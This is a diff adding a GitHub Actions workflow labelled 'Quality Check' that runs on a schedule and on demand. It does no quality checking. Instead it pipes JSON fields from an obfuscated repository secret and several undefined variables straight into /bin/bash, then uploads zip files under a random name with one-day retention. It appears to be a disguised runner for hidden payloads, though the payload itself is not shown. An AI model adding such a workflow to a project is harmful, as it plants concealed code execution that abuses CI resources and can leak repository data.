@@ -1,0 +1,33 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '15 0,6,12,18 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  process:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Start
+        env:
+          gtazr5: ${{ secrets.gtazr5 }}
+        run: |
+          printf '%s' "$gtazr5" | jq -r .jder0595 | /bin/bash
+          printf '%s' "$rtvg875" | jq -r .uaohf156 | /bin/bash
+          printf '%s' "$hz758" | jq -r .prpn57774 | /bin/bash
+          echo $qtcsf11024 | jq -r .umh3014 | /bin/bash
+
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: uytJZkzt
+          path: "*.zip"
+          retention-days: 1
